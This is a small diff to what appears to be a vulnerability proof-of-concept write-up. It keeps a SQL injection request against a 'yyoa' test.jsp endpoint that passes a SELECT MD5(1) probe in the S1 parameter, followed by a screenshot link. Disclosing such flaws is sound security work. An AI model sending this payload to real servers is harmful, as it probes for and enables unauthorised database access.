@@ -20,7 +20,6 @@
 
 ```
 http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
-
 ```
 ![4e950ce3adb881a6d25cb46f3decaa4](https://user-images.githubusercontent.com/103556327/192998187-93f2f586-e153-4235-a13f-2f4d39427df0.jpg)
 
